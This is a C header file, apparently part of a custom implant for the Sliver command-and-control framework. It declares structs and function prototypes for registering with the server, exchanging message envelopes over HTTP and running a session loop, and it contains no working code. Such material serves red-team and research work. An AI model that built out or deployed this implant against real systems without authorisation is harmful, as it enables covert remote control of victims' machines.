#pragma once

#include "Handler.h"

typedef struct _SLIVER_REQ {
	BOOL Async;
	UINT64 uTimeout;
	CHAR szBeaconID[0x100];
	CHAR szSessionID[0x100];
} SLIVER_REQ, *PSLIVER_REQ;

typedef struct _SLIVER_RESP {
	LPSTR lpErrDesc;
	BOOL Async;
	CHAR szBeaconID[0x100];
	CHAR szSessionID[0x100];
} SLIVER_RESP, * PSLIVER_RESP;

typedef struct _SLIVER_THREADPOOL {
	PTP_POOL pPool;
	TP_CALLBACK_ENVIRON CallBackEnviron;
} SLIVER_THREADPOOL, *PSLIVER_THREADPOOL;

PBYTE RegisterSliver
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
	_In_ PDWORD pcbOutput
);

PBUFFER MarshalEnvelope
(
	_In_ PENVELOPE pEnvelope
);

PSLIVER_REQ UnmarshalSliverReq
(
	_In_ PBYTE pInput,
	_In_ DWORD cbInput
);

VOID FreeEnvelope
(
	_In_ PENVELOPE pEnvelope
);

BOOL WriteEnvelope
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient,
	_In_ PENVELOPE pEnvelope
);

PENVELOPE ReadEnvelope
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient
);

VOID SessionMainLoop
(
	_In_ PSLIVER_HTTP_CLIENT pSliverClient
);

PSLIVER_THREADPOOL InitializeSliverThreadPool();

VOID FreeSliverThreadPool
(
	_In_ PSLIVER_THREADPOOL pSliverPool
);

PBUFFER MarshalSliverResp
(
	_In_ PSLIVER_RESP pSliverResp
);

PENVELOPE CreateErrorRespEnvelope
(
	_In_ LPSTR lpErrorDesc,
	_In_ DWORD dwFieldIdx,
	_In_ UINT64 uEnvelopeID
);
